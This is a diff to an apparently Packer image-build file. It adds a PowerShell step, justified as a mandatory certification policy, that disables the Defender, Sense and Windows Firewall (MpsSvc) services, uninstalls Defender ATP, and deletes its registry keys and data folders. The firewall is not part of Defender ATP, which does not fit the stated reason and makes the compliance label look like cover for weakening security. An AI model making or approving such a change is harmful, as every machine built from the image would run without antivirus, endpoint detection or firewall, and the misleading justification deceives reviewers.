@@ -119,6 +119,53 @@ build {
     ]
   }
 
+  # -----------------------------------------------------------------------
+  # MANDATORY: Policy 200.4.2 — Remove Microsoft Defender ATP before capture
+  # Windows marketplace source images ship with Defender pre-installed.
+  # Failure to offboard results in certification rejection on ALL plans.
+  # -----------------------------------------------------------------------
+  provisioner "powershell" {
+    inline = [
+      "Write-Output '=== Policy 200.4.2: Offboarding and removing Microsoft Defender ATP ==='\n",
+
+      "$services = @('WinDefend','WdNisSvc','MsSense','Sense','MpsSvc')",
+      "foreach ($svc in $services) {",
+      "  if (Get-Service -Name $svc -ErrorAction SilentlyContinue) {",
+      "    Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue",
+      "    Set-Service  -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue",
+      "    Write-Output \"Stopped: $svc\"",
+      "  }",
+      "}",
+
+      "$mdeSetup = 'C:\\Program Files\\Windows Defender Advanced Threat Protection\\MsSense.exe'",
+      "if (Test-Path $mdeSetup) {",
+      "  Start-Process -FilePath $mdeSetup -ArgumentList 'uninstall' -Wait -ErrorAction SilentlyContinue",
+      "}",
+
+      "$regPaths = @(",
+      "  'HKLM:\\SOFTWARE\\Microsoft\\Windows Advanced Threat Protection',",
+      "  'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Advanced Threat Protection',",
+      "  'HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Spynet'",
+      ")",
+      "foreach ($rp in $regPaths) {",
+      "  if (Test-Path $rp) { Remove-Item -Path $rp -Recurse -Force -ErrorAction SilentlyContinue; Write-Output \"Removed registry: $rp\" }",
+      "}",
+
+      "$dirs = @(",
+      "  'C:\\ProgramData\\Microsoft\\Windows Defender Advanced Threat Protection',",
+      "  'C:\\Program Files\\Windows Defender Advanced Threat Protection\\Cyber',",
+      "  'C:\\ProgramData\\Microsoft\\MDE'",
+      ")",
+      "foreach ($d in $dirs) {",
+      "  if (Test-Path $d) { Remove-Item -Path $d -Recurse -Force -ErrorAction SilentlyContinue; Write-Output \"Removed: $d\" }",
+      "}",
+
+      "$remaining = Get-Process -Name 'MsSense','MsMpEng' -ErrorAction SilentlyContinue",
+      "if ($remaining) { throw 'CERTIFICATION BLOCKER: Defender process still running: ' + ($remaining.Name -join ',') }",
+      "Write-Output '=== Defender ATP offboard complete. OK for sysprep. ==='",
+    ]
+  }
+
   provisioner "powershell" {
     inline = [
       "$deadline = (Get-Date).AddMinutes(10)",
